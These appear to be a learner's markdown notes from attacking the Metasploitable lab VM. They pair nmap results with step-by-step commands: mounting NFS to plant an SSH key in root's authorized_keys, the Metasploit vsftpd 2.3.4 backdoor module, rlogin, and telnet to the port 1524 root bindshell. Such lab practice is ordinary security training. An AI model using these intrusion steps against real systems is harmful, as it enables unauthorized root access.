# Metasploitable
```
Machine IP : 192.168.0.105
```

# UNIX Basics
```
512,513,514 port is "r" services
 512/tcp  open  exec        netkit-rsh rexecd
 513/tcp  open  login       OpenBSD or Solaris rlogind
 514/tcp  open  tcpwrapped


[+] Command Sheet
rlogin -l {userid} {target_IP}

```

# NFS Access
```
 2049/tcp open  nfs         2-4 (RPC #100003)

[+] Command Sheet
rpcinfo -p {target_ip}
showmount -e {target_ip}

[+]Walkthrought
1. ssh-keygen (saved /root/.ssh/id_rsa.)
2. mkdir /tmp/r00t/
3. mount -t nfs {target_ip}:/ /tmp/r00t/
4. cat ~/.ssh/id_rsa.pub  >> /tmp/r00t/root/.ssh/authorized_keys
5. umount /tmp/r00t/


```

# SSH Backdoor
```
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

[+] vsftpd 2.3.4 is vulerable 

[+]Walkthrought
1. vsftpd2.3.4 -> Metasploit Searched
2. use exploit/unix/ftp/vsftpd_234_backdoor

```

# IRC Backdoor
```
6667/tcp open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:01:26
|   source ident: nmap
|   source host: B7033A0B.F0D9233E.FFFA6D49.IP
|_  error: Closing Link: pfpyxqolw[192.168.0.103] (Quit: pfpyxqolw)


[-] Currently My Machine is not worked at irc

```

# Bind Root Shell
```
1524/tcp open  bindshell   Metasploitable root shell

[+] Walk throught
1. telnet 192.168.0.105 1524


```
